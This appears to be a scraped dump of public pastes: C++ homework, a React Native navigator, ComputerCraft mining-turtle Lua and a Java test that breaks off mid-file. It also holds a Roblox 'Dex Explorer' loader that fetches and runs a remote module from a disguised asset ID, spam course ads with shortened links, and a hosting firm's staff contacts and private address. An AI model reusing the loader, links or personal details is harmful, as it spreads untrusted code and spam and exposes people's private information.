   Avenida La Plata 555, Piso 1 9 - C1235ABC Almagro (Esteban Eduardo Ferriol private)
   Phone - Teléfono: +54 (0)11 4863-8889
   +54 (0)810 999-4678
   Leandro Rubén Capurro leandro@nuthost.com
   info@nuthost.com
   ceo@nuthost.com
   rrhh@nuthost.com
   soporte@nuthost.com
   ventas@nuthost.com
   pagos@nuthost.com
   ventas.especiales@nuthost.com
   marketing@nuthost.com
   abuse@nuthost.com
   info@transmitterhost.com.ar
   correomkt@yahoo.com.ar
   envios1@emailmkt.xyz"
KKk4DUb4,Dex Explorer V4,ModerkaScripts,Lua,Sunday 17th of December 2023 12:28:53 PM CDT,"-- Dex [Moderka Scripts Edition]
-- github.com/ttwizz

pcall(function()
    for Index, Value in next, game:GetObjects(string.format(""rbxassetid://%s"", tostring(15208449142 + 453923123))) do
        if Value:IsA(""ModuleScript"") and Value.Name == ""MainModule"" then
            require(Value):Initialize(game:GetService(""CoreGui""))
        end
    end
end)"
8mRwLwJB,DS - HW#1,UMIT_GATH,C++,Sunday 17th of December 2023 12:10:44 PM CDT,"#include <iostream>


using namespace std;

int n=5;
int current_size = 0;


class student {

public:
    int ID;
    string first_name;
    string last_name;
    int age;
    student(int ID , string first_name , string last_name , int age);
    student(){};

};

student::student(int ID , string first_name , string last_name , int age)
{
    this->ID = ID;
    this->first_name = first_name;
    this->last_name = last_name;
    this->age = age;
}


bool isFull()
{
    if(current_size < n) return false;
    else return true;
}

bool isEmpty()
{
    if(current_size > 0) return false;
    else return true;
}


void Increase_Array_Size(student* &arr)
{
          student* temp_array = new student[n+5];

        for(int i=0 ; i<n ; i++)
            { // copy old elements
                temp_array[i].ID = arr[i].ID;
                temp_array[i].first_name = arr[i].first_name;
                temp_array[i].last_name = arr[i].last_name;
                temp_array[i].age = arr[i].age;

            }

            delete [] arr;

            arr = temp_array;
            n+=5;
}



void Decrease_Array_Size(student* &arr)
{
          student* temp_array = new student[n-1];

        for(int i=0 ; i<n-1 ; i++)
            { // copy old elements
                temp_array[i].ID = arr[i].ID;
                temp_array[i].first_name = arr[i].first_name;
                temp_array[i].last_name = arr[i].last_name;
                temp_array[i].age = arr[i].age;

            }

            delete [] arr;

            arr = temp_array;
            n-=1;
}


int Find_Student(student* &arr,int ID)
{
        for(int i=0; i<current_size ; i++)
            if(arr[i].ID == ID) return i;

return -1;
}


void Add_Student(student* &arr , student newStudent)
{
    if(isFull())
    {
        Increase_Array_Size(arr);
    }

    arr[current_size] = newStudent;
    current_size++;

}

bool Delete_Student(student* &arr , int studentIndex)
{
    if(isEmpty())
    {
        return false;
    }


    for(int i=studentIndex; i<current_size-1 ; i++) // left shift to ignore Last element and delete it
    {

        arr[i] = arr[i+1];

    }

    current_size--;

    Decrease_Array_Size(arr);

    return true;

}

bool Edit_Student(student* &arr , student &anStudent,int ID , string new_first_name , string new_last_name , int age)
{
    if(Find_Student(arr,ID) != -1) return false; // new id is already exist


 anStudent.ID = ID;
 anStudent.first_name = new_first_name;
 anStudent.last_name = new_last_name;
 anStudent.age = age;

 return true;
}

void Print_Students(student *arr)
{

    if(current_size < 1)
    {
        cout<<""\nList Is Empty !!!\n\n"";
        return;
    }

    for(int i=0; i<current_size ; i++)
    {
        cout<<""Student ID: ""<<arr[i].ID<<""\nStudent First Name: ""
        <<arr[i].first_name<<""\nStudent Last Name: ""
        <<arr[i].last_name<<""\nStudent Age: ""
        <<arr[i].age<<""\n\n"";

    }
}






int main()
{

    student *students_list = new student[n];


    int choice = -1;

    student tempStudent;

    do{

            cout<<""\n\n######## Students Manager V1 ########\n\n""
            <<""1-Add new student\n""
            <<""2-Edit exist student\n""
            <<""3-Delete exist student\n""
            <<""4-Find exist student\n""
            <<""5-Print All Students\n""
            <<""6-Exit\n\n""
            <<""Enter Your Choice ==> "";

            cin>>choice;

            switch(choice)
            {
            case (1):{


                cout<<""Enter Student ID: "";
                cin>>tempStudent.ID;

                while(Find_Student(students_list,tempStudent.ID) != -1)
                {
                    cout<<""This ID is already in list \nPlease Enter Valid ID: "";
                    cin>>tempStudent.ID;
                }

                cout<<""Enter Student First Name: "";
                cin>>tempStudent.first_name;

                cout<<""Enter Student Last Name: "";
                cin>>tempStudent.last_name;

                cout<<""Enter Student Age: "";
                cin>>tempStudent.age;

                Add_Student(students_list,tempStudent);

                cout<<""\nStudent Added Succefully !\n\n"";

            break;}

            case (2):{


                cout<<""Enter Student ID: "";
                cin>>tempStudent.ID;

                int search_result = Find_Student(students_list,tempStudent.ID);

                if(search_result == -1)
                    {cout<<""This Student Dosn't Exist !!\n\n"";}
                else
                    {
                        cout<<""Enter New Student Details:\n""
                          <<""ID [""<<students_list[search_result].ID <<""] ==> "";
                          cin>>students_list[search_result].ID;

                        cout<<""First Name [""<<students_list[search_result].first_name <<""] ==> "";
                          cin>>students_list[search_result].first_name;

                        cout<<""Last Name [""<<students_list[search_result].last_name <<""] ==> "";
                          cin>>students_list[search_result].last_name;

                        cout<<""Age [""<<students_list[search_result].age <<""] ==> "";
                          cin>>students_list[search_result].age;
                    }

            break;}


            case (3):{

                cout<<""Enter Student ID: "";
                cin>>tempStudent.ID;

                int search_result = Find_Student(students_list,tempStudent.ID);

                if(search_result == -1)
                    {cout<<""This Student Dosn't Exist !!\n\n"";}
                else
                    {
                        Delete_Student(students_list,search_result);
                        cout<<""Student at location [""<<search_result<<""] Have Been Deleted !!\n\n"";
                    }


            break;}

            case (4):{

                cout<<""Enter Student ID: "";
                cin>>tempStudent.ID;

                int search_result = Find_Student(students_list,tempStudent.ID);

                if(search_result == -1)
                    {cout<<""This Student Dosn't Exist !!\n\n"";}
                else
                    {
                        cout<<""Student Details:\n""
                          <<""ID => ""<<students_list[search_result].ID <<endl
                          <<""First Name => ""<<students_list[search_result].first_name <<endl
                          <<""Last Name => ""<<students_list[search_result].last_name <<endl
                          <<""Age => ""<<students_list[search_result].age <<""\n\n"";
                    }

            break;}

            case (5):{
                Print_Students(students_list);
            break;}

            case (6):{
                cout<<""Good Bye !!!\n"";
            break;}

            default:
                cout<<""This option not exist !!!\n"";
            }


    } while(choice != 6);


    delete []students_list;
    return 0;
}
"
nTNUZJ9h,Untitled,krintax,TypeScript,Sunday 17th of December 2023 11:56:19 AM CDT,"const Stack = createNativeStackNavigator();
const Tab = createBottomTabNavigator();

const DEFAULT_TAB_OPTIONS = {
  headerShown: false,
  tabBarLabel: '',
  tabBarActiveTintColor: '#ffffff',
  tabBarInactiveTintColor: '#7E8EA3',
};

const AuthenticatedTabNavigator = () => {
  const {theme} = useTheme();
  return (
    <Tab.Navigator
      screenOptions={{
        tabBarStyle: {
          padding: 16,
          height: 72,
          backgroundColor: `${theme.BACKGROUND_POST}`,
        },
      }}>
      <Tab.Screen
        name=""Home""
        component={HomeScreen}
        options={{
          tabBarIcon: ({color}) => <Icon name={'home'} color={color} />,

          ...DEFAULT_TAB_OPTIONS,
        }}
      />
      {/*  Removed other screens*/}
    </Tab.Navigator>
  );
};

const UnauthenticatedNavigator = () => {
  return (
    <Stack.Navigator screenOptions={{headerShown: false}}>
      <Stack.Screen name=""GetStartedScreen"" component={GetStartedScreen} />
      {/*  Removed other screens*/}
    </Stack.Navigator>
  );
};

function OnboardingNavigator() {
  return (
    <Stack.Navigator screenOptions={{headerShown: false}}>
      <Stack.Screen
        name=""EmailConfirmationScreen""
        component={EmailConfirmationScreen}
      />
    </Stack.Navigator>
  );
}

const AuthenticatedNavigator = () => {
  return (
    <Stack.Navigator screenOptions={{headerShown: false}}>
      <Stack.Screen name=""HomeTab"" component={AuthenticatedTabNavigator} />
      <Stack.Screen
        name=""ChangePasswordScreen""
        component={ChangePasswordScreen}
      />
      {/*  Removed other screens*/}
    </Stack.Navigator>
  );
};

const Navigator = () => {
  const {isSignedIn, user} = useAuth();

  if (isSignedIn) {
    return user.emailConfirmed ? (
      <AuthenticatedNavigator />
    ) : (
      <OnboardingNavigator />
    );
  }

  return <UnauthenticatedNavigator />;
};

export default Navigator;"
R9M583sD,Untitled,sissou123,Python,Sunday 17th of December 2023 11:48:11 AM CDT,"Data Science: Modern Deep Learning in Python
Build with modern libraries like Tensorflow, Theano, Keras, PyTorch, CNTK, MXNet. Train faster with GPU on AWS.
for more:https://dz-linkk.com/K71lO"
UCuLy2W8,Untitled,sissou123,Python,Sunday 17th of December 2023 11:35:25 AM CDT,"Machine Learning, Data Science and Generative AI with Python
Complete hands-on machine learning and AI tutorial with data science, Tensorflow, GPT, OpenAI, and neural networks
for more:https://dz-linkk.com/jPvq5"
QXJrcgYF,branch.lua,aegouihaegouha4gouha,Lua,Sunday 17th of December 2023 11:29:40 AM CDT,"-- branch.lua
-- branch program
-- special ggOS Turtle edition

local isProgRunning = true
local hasStarted = false
local isRunning=false
local isStopped=true
local x=0
local y=0
local z=0
local d=0
local intervals = 1000000

os.loadAPI(""/ggOS/gg.lua"")
-- if branch design dir not exists, create
local isLoad = true
if not fs.isDir(""bd"") then 
	fs.makeDir(""bd"")
end

function cwrite(msg,colr,bgcolor)
    local sc = term.getTextColor()
	local sbc = term.getBackgroundColor()
    term.setTextColor(colr)
	if bgcolor ~= nil then 
		term.setBackgroundColor(bgcolor)
	end
    write(msg)
    term.setTextColor(sc)
	term.setBackgroundColor(sbc)
end

function statusUpdate(st)
	local stx, sty = term.getCursorPos()
	term.setCursorPos(32,1)
	write(""        "")
	term.setCursorPos(32,1)
	if st == ""RUNNING"" then
		cwrite("" RUNNING"", colors.green)
	elseif st == ""STOPPED"" then
		cwrite("" STOPPED"", colors.red)
	elseif st == ""RESUMING"" then
		cwrite(""RESUMING"", colors.orange)
	elseif st == ""STOPPING"" then
		cwrite(""STOPPING"", colors.orange)
	elseif st == ""OFF"" then
		cwrite(""     OFF"", colors.gray)
	end
	
	term.setCursorPos(stx,sty)
end

local currTermBg = term.getBackgroundColor()
local currTermTx = term.getTextColor()
term.setBackgroundColor(colors.black)
term.setTextColor(colors.white)
term.clear()

term.setCursorPos(1,1)
print(""Branch Miner"")
term.setCursorPos(17,1)
cwrite("" START "", colors.green, colors.gray)
-- monitor 39x19
statusUpdate(""OFF"")
term.setCursorPos(1,3)
print(""x: 0, y: 0, z: 0\n"")
write(""Z: "")
gg.cwrite(""+"",colors.green,colors.gray)
gg.cwrite(""-"",colors.red,colors.gray)
write(""\nY: "")
gg.cwrite(""+"",colors.green,colors.gray)
gg.cwrite(""-"",colors.red,colors.gray)
write(""\nD: "")
gg.cwrite(""+"",colors.green,colors.gray)
gg.cwrite(""-"",colors.red,colors.gray)

term.setCursorPos(8,5)
gg.cwrite(""Load"", colors.black, colors.blue)
term.setCursorPos(14,5)
gg.cwrite(""Save"", colors.blue, colors.black)

function drawLoad()
	term.setCursorPos(8,5)
	gg.cwrite(""Load"",colors.black,colors.blue)
	term.setCursorPos(14,5)
	gg.cwrite(""Save"",colors.blue,colors.black)
	term.setCursorPos(8,7)
	cwrite("" 1  2  3  4"", colors.red)
	term.setCursorPos(8,8)
	cwrite("" 5  6  7  8"", colors.red)
	term.setCursorPos(8,9)
	cwrite("" 9 10 11 12"", colors.red)
	term.setCursorPos(8,10)
	cwrite(""13 14 15 16"", colors.red)
end

function drawSave()
	term.setCursorPos(8,5)
	gg.cwrite(""Load"",colors.blue,colors.black)
	term.setCursorPos(14,5)
	gg.cwrite(""Save"",colors.black,colors.blue)
	term.setCursorPos(8,7)
	cwrite("" 1  2  3  4"", colors.green)
	term.setCursorPos(8,8)
	cwrite("" 5  6  7  8"", colors.green)
	term.setCursorPos(8,9)
	cwrite("" 9 10 11 12"", colors.green)
	term.setCursorPos(8,10)
	cwrite(""13 14 15 16"", colors.green)
end

drawLoad()

term.setCursorPos(1,12)
write(""Repeats: "")
write(""<"")
gg.cwrite(""+"",colors.green,colors.gray)
write(""  x  "")
gg.cwrite(""-"",colors.red,colors.gray)
write("">"")

local fuelstr = ""Fuel: "" .. turtle.getFuelLevel()
term.setCursorPos(40-#fuelstr,2)
write(fuelstr)
term.setCursorPos(28,4)
gg.cwrite(""Exit Program"", colors.white, colors.red)


-- note: this looks inverted to what turtle sees
-- bdesign rows need to have odd number of items


local bdesign = {}
bdesign[1] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}
bdesign[2] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}
bdesign[3] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}

local bdesignCenter = (#bdesign[1]-1)/2+1

function drawDesign()
	for i=1, 9 do
		term.setCursorPos(40-19,14-i)
		if i <= #bdesign then
			for j=1, #bdesign[i] do
				cwrite("" "", colors.white, (bdesign[i][j] == 1 and colors.green or colors.gray))
			end
		else
			cwrite(""                   "", colors.white, colors.lightGray)
		end
	end
end

drawDesign()

term.setCursorPos(1,13)
write(""Branch Rows: "")
cwrite(""+"",colors.green,colors.gray)
write("" ""..#bdesign.."" "")
cwrite(""-"", colors.red,colors.gray)


function control()
	local event, button, mousex, mousey = os.pullEvent(""mouse_click"")
	
	if mousex >= 17 and mousex <= 23 and mousey == 1 then
		-- start/pause button
		if not hasStarted then
			term.setCursorPos(1,5)
			write(""     \n     \n     "")
		end
		if isRunning then
			term.setCursorPos(17,1)
			cwrite("" START "", colors.green, colors.gray)
			statusUpdate(""STOPPING"")
		else
			term.setCursorPos(17,1)
			cwrite("" PAUSE "", colors.red, colors.gray)
			statusUpdate(""RESUMING"")
		end
		isRunning = not isRunning
	elseif mousex >= 28 and mousex <= 39 and mousey == 4 then
		-- exit program (run startup)
		isProgRunning = false
		term.clear()
		term.setCursorPos(1,1)
		print(""Returning to program list..."")
		term.setBackgroundColor(currTermBg)
		term.setTextColor(currTermTx)
		shell.exit()
	elseif mousex >= 8 and mousex <= 11 and mousey == 5 then
		-- load button
		drawLoad()
		isLoad = true
	elseif mousex >= 14 and mousex <= 17 and mousey == 5 then
		-- save button
		drawSave()
		isLoad = false
	elseif mousex >= 8 and mousex <= 18 and mousey >= 7 and mousey <= 10 then
		-- save/load branch designs
		-- row is column and column is row haha
		local row = mousex-7
		local column = mousey - 6
		if row % 3 ~= 0 then -- in case click in space btwn numbers
			row = (row + 3 - row % 3) / 3
		else row = 0 end
		
		local n = tostring((column - 1) * 4 + row)

		local paddedN = """"
		for i=1, 2-#n do
			paddedN = paddedN .. "" ""
		end
		paddedN = paddedN .. n
		if row ~= 0 then
			if isLoad then
				-- load
				if fs.exists(""bd/"" .. n .. "".design"") then
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.black, colors.red)
				sleep(0.1)
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.red, colors.black)
				term.setCursorPos(21,4)
				write(paddedN)
				local h = fs.open(""bd/"" .. n .. "".design"", ""r"")
				bdesign = textutils.unserialize(h.readAll())
				h.close()
				drawDesign()
				term.setCursorPos(16,13)
				write(#bdesign)
				end
			else
				-- save
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.black, colors.green)
				sleep(0.1)
				term.setCursorPos(8+(row-1)*3,6+column)
				gg.cwrite(paddedN, colors.green, colors.black)
				term.setCursorPos(21,4)
				write(paddedN)
				local h = fs.open(""bd/"" .. n .. "".design"", ""w"")
				h.write(textutils.serialize(bdesign))
				h.close()
			end
		end
	elseif mousex >= 21 and mousex <= 39 and mousey >= 5 and mousey <= 13 then
		-- changing branch pattern
		if isStopped then
			-- only update when turtle is stopped
			if mousex ~= 30 then
				-- cannot modify the middle layer
				
				-- convert mouse coords to bdesign coords
				local bdx = mousex - 20
				local bdy = 14 - mousey
				if bdy <= #bdesign then
					bdesign[bdy][bdx] = (bdesign[bdy][bdx] == 0 and 1 or 0)
					term.setCursorPos(mousex,mousey)
					cwrite("" "", colors.white, (bdesign[bdy][bdx] == 1 and colors.green or colors.gray))
				end
			end
		end
	elseif mousex == 4 and mousey == 5 and not hasStarted then
		turtle.forward()
	elseif mousex == 5 and mousey == 5 and not hasStarted then
		turtle.back()
	elseif mousex == 4 and mousey == 6 and not hasStarted then
		turtle.up()
	elseif mousex == 5 and mousey == 6 and not hasStarted then
		turtle.down()
	elseif mousex == 4 and mousey == 7 and not hasStarted then
		turtle.turnRight()
	elseif mousex == 5 and mousey == 7 and not hasStarted then
		turtle.turnLeft()
	elseif mousex == 14 and mousey == 13 then
		-- increase rows
		if #bdesign < 9 and isStopped then
			bdesign[#bdesign+1] = {0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0}
			term.setCursorPos(16,13)
			write(#bdesign)
			term.setCursorPos(40-#bdesign[1],14-#bdesign)
			for i=1, #bdesign[#bdesign] do
				cwrite("" "", colors.white, (bdesign[#bdesign][i] == 1 and colors.green or colors.gray))
			end
		end
	elseif mousex == 18 and mousey == 13 then
		-- decrease rows
		if #bdesign > 1 and isStopped then
			term.setCursorPos(40-#bdesign[1],14-#bdesign)
			for i=1, #bdesign[#bdesign] do
				cwrite("" "", colors.white, colors.lightGray)
			end
			bdesign[#bdesign] = nil
			term.setCursorPos(16,13)
			write(#bdesign)
		end
	end
	if isProgRunning then control() end
end

function checkInv() 
	if turtle.getItemSpace(16) ~= 64 then
		-- inventory full. return to home base
		-- save current position and direction
		local sx = x
		local sy = y
		local sz = z
		local sd = d
		
		if x ~= 0 then
			-- not in main hall
			goDir(x < 0 and ""right"" or ""left"")
			while x ~= 0 do
				tFwd()
			end
		end
		
		-- empty inventory and come back to original pos and direction
		goDir(""backward"")
		while z ~= 0 do
			
			tFwd()
		end
		goDir(""left"")
		tFwd()
		
		for p=2,16 do
        turtle.select(p)
        turtle.dropDown()
        end
        turtle.select(1)
		
		goDir(""right"")
		tFwd()
		goDir(""forward"")
		while z ~= sz do
			tFwd()
		end
		
		goDir(sx < 0 and ""left"" or ""right"")
		while x ~= sx do
			tFwd()
		end
		goDir(sd)
	end
end

function main() 
	--local bdx = mousex - 20
	--local bdy = 14 - mousey
	if isRunning then
		
		statusUpdate(""RUNNING"")
		isStopped = false
		for i=1, #bdesign do
			
			tbtdig()
			if z % 4 == 0 then
				turtle.select(1)
				if turtle.getItemDetail().name == ""minecraft:torch"" then turtle.placeDown() end
			end
			local j = bdesignCenter
			term.setCursorPos(39-19+j,14-i)
			cwrite("" "",colors.white,colors.purple)
			if i > 1 then
				term.setCursorPos(39-19+j,15-i)
				cwrite("" "",colors.white,colors.yellow)
			end
			-- check if left block can be destroyed
			-- if so, start loop to destroy all
			-- blocks to left are gone
			if bdesign[i][j-1] == 1 then
				goDir(""left"")
				while j - 1 > 0 and bdesign[i][j-1] == 1 do
					tbtdig()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j - 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
				goDir(""right"")
				while j < bdesignCenter do
					tFwd()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j + 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
			end
			if bdesign[i][j+1] == 1 then
				goDir(""right"")
				while j + 1 < #bdesign[i] and bdesign[i][j+1] == 1 do
					tbtdig()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j + 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
				goDir(""left"")
				while j > bdesignCenter do
					tFwd()
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.yellow)
					j = j - 1
					term.setCursorPos(39-19+j,14-i)
					cwrite("" "",colors.white,colors.purple)
				end
			end
			goDir(""forward"")
		end
		drawDesign()
	else
		
		statusUpdate(""STOPPED"")
		isStopped = true
		sleep(1)
	end
	if isProgRunning then main() end
end

function goDir(desiredDir)
	if desiredDir == ""forward"" then desiredDir = 0
	elseif desiredDir == ""right"" then desiredDir = 1
	elseif desiredDir == ""backward"" then desiredDir = 2
	elseif desiredDir == ""left"" then desiredDir = 3
	end
	if d ~= desiredDir then
		if d > desiredDir then
			-- special case
			if d == 3 and desiredDir == 0 then turtle.turnRight()
			else
				for k=1, d-desiredDir do turtle.turnLeft() end
			end
		else
			if d == 0 and desiredDir == 3 then turtle.turnLeft()
			else
				for k=1, desiredDir-d do turtle.turnRight() end
			end
		end
		d = desiredDir
	end
end

function updatePOS(goin)
	if goin == 0 then
		if d == 0 then z = z + 1
		elseif d == 1 then x = x + 1
		elseif d == 2 then z = z - 1
		elseif d == 3 then x = x - 1
		end
	end
	term.setCursorPos(1,3)
	term.clearLine()
	print(""x: ""..x.."", y: ""..y.."", z: ""..z)
end

-- dig a 1x1x3 column in front of turtle
function tbtdig()
    turtle.dig()
    checkInv()
    tFwd()
    turtle.digUp()
    checkInv()
    turtle.digDown()
    checkInv()
end

function tFwd()
    local isRed = true
    while not turtle.forward() do
		turtle.dig()
		term.setCursorPos(1,2)
		if isRed then
			cwrite(""something is in the way!!"", colors.red)
			isRed = false
		else
			cwrite(""something is in the way!!"", colors.yellow)
			isRed = true
		end
    end
	term.setCursorPos(1,2)
	write(""                         "")
	updatePOS(0)
end

parallel.waitForAll(main, control)
"
G1pGacSj,startup.lua,aegouihaegouha4gouha,Lua,Sunday 17th of December 2023 11:28:45 AM CDT,"-- startup.lua
term.setBackgroundColor(colors.lightBlue)
term.setTextColor(colors.black)
term.clear()
term.setCursorPos(1,1)
os.loadAPI(""ggos/gg.lua"")
print(""eee"")
local endermodem = peripheral.wrap(""top"")
local inProgram = false
-- 39x13

-- define buttons
local buttons = {
	desktop = {
		settings = {
			x1    = 14,
			x2    = 25,
			y1    = 8,
			y2    = 10,
		},
		programs = {
			x1    = 3,
			x2    = 14,
			y1    = 3,
			y2    = 5,
		},
		network = {
			x1    = 17,
			x2    = 27,
			y1    = 4,
			y2    = 6,
		},
		
		
	},
	settings = {
		close = {
			x1    = 37,
			x2    = 39,
			y1    = 2,
			y2    = 2,
		},
	},
	programs = {
		close = {
			x1    = 37,
			x2    = 39,
			y1    = 2,
			y2    = 2,
		},
		branch = {
			x1 = 3,
			x2 = 8,
			y1 = 5,
			y2 = 5,
		}
	}
}

local gui = {
	desktop = {
		{
			x1 = 1,
			x2 = 39,
			y1 = 1,
			y2 = 1,
			bgcolor = colors.gray,
			txt= false
		},
		{
			x1 = 3,
			x2 = 14,
			y1 = 3,
			y2 = 5,
			bgcolor = colors.orange,
			txt = false
		},
		{
			x1 = 17,
			x2 = 27,
			y1 = 4,
			y2 = 6,
			bgcolor = colors.orange,
			txt = false
		},
		{
			x1 = 14,
			x2 = 25,
			y1 = 8,
			y2 = 10,
			bgcolor = colors.orange,
			txt = false
		},
		{
			x1    = 15,
			x2    = 15,
			y1    = 9,
			y2    = 9,
			txt   = "" Settings "",
			color = colors.black,
			bgcolor = colors.orange,
		},
		{
			x1    = 4,
			x2    = 4,
			y1    = 4,
			y2    = 4,
			txt   = "" Programs "",
			color = colors.black,
			bgcolor = colors.orange,
		},
		{
			x1    = 18,
			x2    = 4,
			y1    = 5,
			y2    = 5,
			txt   = "" Network "",
			color = colors.black,
			bgcolor = colors.orange,
		},
		{
			x1    = 1,
			x2    = 1,
			y1    = 1,
			y2    = 1,
			txt   = ""ggOS Turtle 1.0"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1    = 30,
			x2    = 30,
			y1    = 1,
			y2    = 1,
			txt   = ""Fuel: ...%"",
			color = colors.white,
			bgcolor = colors.gray,
		},
	},
	settings = {
		{
			x1 = 1,
			x2 = 39,
			y1 = 1,
			y2 = 1,
			bgcolor = colors.gray,
			txt= false
		},
		{
			x1    = 1,
			x2    = 1,
			y1    = 1,
			y2    = 1,
			txt   = ""ggOS Turtle 1.0"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1    = 30,
			x2    = 30,
			y1    = 1,
			y2    = 1,
			txt   = ""Fuel: ...%"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1 = 1,
			x2 = 39,
			y1 = 2,
			y2 = 13,
			txt = false,
			bgcolor = colors.lightGray,
		},
		{
			x1 = 37,
			x2 = 37,
			y1 = 2,
			y2 = 2,
			txt = "" X "",
			color = colors.black,
			bgcolor = colors.red,
		},
		{
			x1 = 2,
			x2 = 2,
			y1 = 3,
			y2 = 3,
			txt = ""ID: "" .. os.getComputerID(),
			color = colors.black,
			bgcolor = colors.lightGray
		},
		{
			x1 = 2,
			x2 = 2,
			y1 = 4,
			y2 = 4,
			txt = ""Name: "",
			color = colors.black,
			bgcolor = colors.lightGray
		},
		{
			x1 = 8,
			x2 = 8,
			y1 = 4,
			y2 = 4,
			txt = ""            "",
			color = colors.black,
			bgcolor = colors.white
		},
	},
	programs =  {
		{
			x1 = 1,
			x2 = 39,
			y1 = 1,
			y2 = 1,
			bgcolor = colors.gray,
			txt= false
		},
		{
			x1    = 1,
			x2    = 1,
			y1    = 1,
			y2    = 1,
			txt   = ""ggOS Turtle 1.0"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1    = 30,
			x2    = 30,
			y1    = 1,
			y2    = 1,
			txt   = ""Fuel: ...%"",
			color = colors.white,
			bgcolor = colors.gray,
		},
		{
			x1 = 1,
			x2 = 39,
			y1 = 2,
			y2 = 13,
			txt = false,
			bgcolor = colors.lime,
		},
		{
			x1 = 37,
			x2 = 37,
			y1 = 2,
			y2 = 2,
			txt = "" X "",
			color = colors.black,
			bgcolor = colors.red,
		},
		{
			x1=2,
			x2=2,
			y1=3,
			y2=3,
			txt = ""Programs"",
			color = colors.black,
			bgcolor = colors.lime,
		},
		{
			x1=3,
			x2=3,
			y1=5,
			y2=5,
			txt = ""Branch"",
			color = colors.black,
			bgcolor = colors.lime,
		},
		{
			x1=3,
			x2=3,
			y1=7,
			y2=7,
			txt = ""Maps"",
			color = colors.black,
			bgcolor = colors.lime,
		},
	}
}

local currPage = ""programs""


function btnFunc (page, ibtn, mousebtn) 
	if page == ""desktop"" then
		if ibtn == ""settings"" and mousebtn == 1 then
			-- settings
			currPage = ""settings""
			drawGUI(currPage)
		elseif ibtn == ""programs"" and mousebtn == 1 then
			-- programs
			currPage = ""programs""
			drawGUI(currPage)
		elseif ibtn == ""network"" and mousebtn == 1 then
			-- network

		end
	elseif page == ""settings"" then
		if ibtn == ""close"" and mousebtn == 1 then
			-- desktop (close)
			currPage = ""desktop""
			drawGUI(currPage)
		end
	elseif page == ""programs"" then
		if ibtn == ""close"" and mousebtn == 1 then
			-- desktop (close)
			currPage = ""desktop""
			drawGUI(currPage)
		elseif ibtn == ""branch"" and mousebtn == 1 then
			inProgram = true
			shell.run(""/branch.lua"")
			inProgram = false
			drawGUI(currPage)
		end

	end
end

-- function to draw gui
function drawGUI(page) 
	term.clear()
	for k,v in pairs (gui[page]) do
		--term.setCursorPos(13,1)
		--term.clearLine()
		--print(""k: "" .. k .. "", v: "" .. v)
		for i=v.y1, v.y2 do
			term.setCursorPos(v.x1,i)
			if v.txt then
				term.setCursorPos(v.x1,v.y1)
				gg.cwrite(v.txt, v.color, v.bgcolor)
			else
				for j=v.x1, v.x2 do
					gg.cwrite("" "", colors.black, v.bgcolor)
				end
			end
		end
	end
end

drawGUI(currPage)




function main ()
	if isRunning then
		
		sleep(1)
	else
		sleep(1)
	end
	if not inProgram then 
		term.setCursorPos(36,1)
		gg.cwrite(gg.fuel(true),colors.white,colors.gray) 
	end
	main()
end

function control ()
	local event, button, mousex, mousey = os.pullEvent(""mouse_click"")
	for k,v in pairs (buttons[currPage]) do
		if mousex >= v.x1 and mousex <= v.x2 and mousey >= v.y1 and mousey <= v.y2 then
			term.setCursorPos(18,1)
			write(""key: "" .. k)
			btnFunc(currPage,k, button)
		end
	end
	
	control()
end

parallel.waitForAll(main, control)"
vkKdkXri,Untitled,sissou123,Python,Sunday 17th of December 2023 11:23:07 AM CDT,"Python for Machine Learning & Data Science Masterclass
Learn about Data Science and Machine Learning with Python! Including Numpy, Pandas, Matplotlib, Scikit-Learn and more!
for more:https://dz-linkk.com/4eINGS"
cMRJJ2Xq,poo test2,STANAANDREY,Java,Sunday 17th of December 2023 10:42:27 AM CDT,"
abstract class Task {
    protected String name;

    public Task(final String name) {
        this.name = name;
    }

    public abstract boolean execute(double time);
}

class SimpleTask extends Task {
    private double necTime;

    public SimpleTask(final String name, double necTime) {
        super(name);
        this.necTime = necTime;
    }

    @Override
    public boolean execute(double time) {
        if (time >= necTime) {
            necTime = 0;
            return true;
        }
        necTime -= time;
        return false;
    }

    @Override
    public String toString() {
        return ""Name: "" + name + "", Time: "" + necTime + "";"";
    }
}

class ComposedTask extends Task {
    private SimpleTask[] simpleTasks;

    public ComposedTask(final String name, SimpleTask[] simpleTasks) {
        super(name);
        this.simpleTasks = simpleTasks;
    }

    @Override
    public boolean execute(double time) {
        double q = time / simpleTasks.length;
        boolean finished = true;
        for (int i = 0; i < simpleTasks.length; i++) {
            finished &= simpleTasks[i].execute(q);
        }
        return finished;
    }

    @Override
    public String toString() {
        String s = ""Name: "" + name + "", COntent: ("";
        for (int i = 0; i < simpleTasks.length; i++) {
            s += simpleTasks[i] + "" "";
        }
        return s + "")"";
    }
}

class Processor {
    private Task[] tasks;

    public Processor(Task[] tasks) {
        this.tasks = tasks;
    }

    public void finishAllTasks() {
        boolean finished = false;
        while (!finished) {
            finished = true;
            for (int i = 0; i < tasks.length; i++) {
                finished &= tasks[i].execute(5);
            }
        }
    }

    @Override
    public String toString() {
        String s = ""Proc: "";
        for (int i = 0; i < tasks.length; i++) {
            s += tasks[i] + ""; "";
        }
        return s;
    }
}

public class Main {
    public static void main(String[] args) {
        var st1 = new SimpleTask(""st1"", 5);
        var st2 = new SimpleTask(""st2"", 10);
